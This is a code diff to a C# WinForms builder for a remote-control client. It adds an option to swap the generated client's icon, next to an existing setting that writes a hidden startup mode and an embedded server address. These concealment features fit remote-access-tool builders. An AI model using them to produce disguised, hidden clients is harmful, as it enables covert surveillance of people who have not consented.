@@ -8,6 +8,7 @@ using System.Text;
 using System.Windows.Forms;
 using RemoteControl.Protocals;
 using RemoteControl.Protocals.Utilities;
+using RemoteControl.Server.Utils;
 
 namespace RemoteControl.Server
 {
@@ -25,6 +26,7 @@ namespace RemoteControl.Server
             this.textBoxServerIP.Text = Settings.CurrentSettings.ClientPara.ServerIP;
             this.textBoxServerPort.Text = Settings.CurrentSettings.ClientPara.ServerPort.ToString();
             this.textBoxLocalServerPort.Text = Settings.CurrentSettings.ServerPort.ToString();
+            //this.pictureBoxAppIcon.BackgroundImage = Image.FromFile(@"C:\Users\Administrator\AppData\Roaming\iconmaster\output\control.ico");
         }
 
         private void buttonSaveServerSetting_Click(object sender, EventArgs e)
@@ -75,6 +77,11 @@ namespace RemoteControl.Server
                 byte[] fileBytes = null;
                 if (System.IO.File.Exists("RemoteControl.Client.dat"))
                 {
+                    // 修改图标
+                    if (this.checkBoxAppIcon.Checked && this.pictureBoxAppIcon.Tag != null)
+                    {
+                        IconChanger.ChangeIcon("RemoteControl.Client.dat", this.pictureBoxAppIcon.Tag as string);
+                    }
                     // 读取本地文件
                     fileBytes = System.IO.File.ReadAllBytes("RemoteControl.Client.dat");
                 }
@@ -85,8 +92,10 @@ namespace RemoteControl.Server
                     // 读取资源文件
                     //fileBytes = ResUtil.GetResFileData("RemoteControl.Client.dat"); 
                 }
+                // 修改启动模式
                 ClientParametersManager.WriteClientStyle(fileBytes,
                     this.checkBoxHideClient.Checked ? ClientParametersManager.ClientStyle.Hidden : ClientParametersManager.ClientStyle.Normal);
+                // 修改参数
                 ClientParametersManager.WriteParameters(fileBytes, dialog.FileName, para);
                 MsgBox.ShowInfo("客户端生成成功！");
             }
@@ -94,7 +103,7 @@ namespace RemoteControl.Server
 
         private void buttonSelectIP_Click(object sender, EventArgs e)
         {
-            var ips = Utils.GetIPAddressV4();
+            var ips = CommonUtil.GetIPAddressV4();
             ContextMenuStrip cms = new ContextMenuStrip();
             ips.ForEach(a =>
             {
@@ -121,6 +130,26 @@ namespace RemoteControl.Server
                 this.pictureBoxAvatar.Tag = avatarFileName;
                 this.pictureBoxAvatar.BackgroundImage = Image.FromFile(avatarFile);
             }
+        }
+
+        private void pictureBoxAppIcon_Click(object sender, EventArgs e)
+        {
+            OpenFileDialog ofd = new OpenFileDialog();
+            ofd.Multiselect = false;
+            ofd.Title = "请选择图标";
+            ofd.Filter = "*.ico|*.ico";
+            ofd.FilterIndex = 1;
+            if (ofd.ShowDialog() != System.Windows.Forms.DialogResult.OK)
+            {
+                return;
+            }
+            this.pictureBoxAppIcon.Tag = ofd.FileName;
+            this.pictureBoxAppIcon.BackgroundImage = Image.FromFile(ofd.FileName);
+        }
+
+        private void checkBoxAppIcon_CheckedChanged(object sender, EventArgs e)
+        {
+            this.pictureBoxAppIcon.Visible = checkBoxAppIcon.Checked;
         }
     }
 }
